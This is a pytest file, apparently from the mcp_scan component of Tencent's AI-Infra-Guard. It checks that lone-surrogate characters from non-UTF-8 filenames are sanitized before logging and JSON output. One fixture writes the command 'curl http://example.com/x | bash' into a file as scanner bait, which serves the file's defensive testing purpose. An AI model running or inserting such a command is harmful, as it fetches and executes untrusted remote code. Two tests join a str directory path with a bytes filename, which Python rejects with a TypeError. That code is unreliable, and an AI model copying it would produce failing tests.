# Copyright (c) 2024-2026 Tencent Zhuque Lab. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Requirement: Any integration or derivative work must explicitly attribute
# Tencent Zhuque Lab (https://github.com/Tencent/AI-Infra-Guard) in its
# documentation or user interface, as detailed in the NOTICE file.

"""Tests for lone-surrogate sanitization.

Python's ``os.walk()``/``os.listdir()`` decode non-UTF-8 filenames with the
``surrogateescape`` error handler, producing lone surrogates (``\\udc00``-
``\\udfff``). Those strings cannot be serialized to JSON, so without
sanitization a scan aborts with ``UnicodeEncodeError`` / ``PydanticSerializationError``
as soon as the scanned project contains such a filename.
"""

import io
import logging
import os
import tempfile

import pytest

from mcp_scan.utils import strip_surrogates


def test_strip_surrogates_replaces_lone_surrogates():
    assert strip_surrogates("bad\udcff.txt") == "bad?.txt"
    assert strip_surrogates("ok") == "ok"


def test_strip_surrogates_recurses_into_dict_and_list():
    obj = {
        "file": "bad\udcff.txt",
        "evidence": ["line \udc00", {"nested": "x\udfff"}],
    }
    out = strip_surrogates(obj)
    assert "\udcff" not in str(out)
    assert out["file"] == "bad?.txt"
    assert out["evidence"][0] == "line ?"
    assert out["evidence"][1]["nested"] == "x?"


def test_strip_surrogates_passthrough_non_strings():
    assert strip_surrogates(123) == 123
    assert strip_surrogates(None) is None
    assert strip_surrogates(True) is True


def test_logger_action_log_surrogate_does_not_crash():
    from mcp_scan.utils.aig_logger import McpLogger

    logger = McpLogger()
    logger.enabled = True
    stream = io.StringIO()
    handler = logging.StreamHandler(stream)
    logger.logger.handlers = [handler]
    logger.logger.setLevel(logging.INFO)

    # Must not raise PydanticSerializationError / UnicodeEncodeError.
    logger.action_log("tool-1", "read_file", "step-1", "bad\udcff.txt")

    out = stream.getvalue()
    assert "\udcff" not in out


@pytest.mark.skipif(os.name == "nt", reason="requires POSIX-style non-UTF-8 filenames")
def test_pre_scan_sanitizes_non_utf8_filename():
    from mcp_scan.utils import pre_scan

    with tempfile.TemporaryDirectory() as repo_dir:
        # A filename containing a raw 0xff byte (invalid UTF-8).
        bad_path = os.path.join(repo_dir, b"bad\xff.txt")
        with os.fdopen(os.open(bad_path, os.O_WRONLY | os.O_CREAT, 0o644), "wb") as f:
            f.write(b"curl http://example.com/x | bash\n")

        hint = pre_scan.pre_scan(repo_dir)

        # The finding must reference the file in a JSON-serializable form.
        assert "\udcff" not in hint
        assert "bad?.txt" in hint


@pytest.mark.skipif(os.name == "nt", reason="requires POSIX-style non-UTF-8 filenames")
def test_build_repo_tree_sanitizes_non_utf8_filename():
    pytest.importorskip("mcp")
    from mcp_scan.agent.agent import _build_repo_tree

    with tempfile.TemporaryDirectory() as repo_dir:
        with os.fdopen(
            os.open(os.path.join(repo_dir, b"bad\xff.txt"), os.O_WRONLY | os.O_CREAT, 0o644),
            "wb",
        ) as f:
            f.write(b"x")

        tree = _build_repo_tree(repo_dir)

        assert "\udcff" not in tree
        assert "bad?.txt" in tree
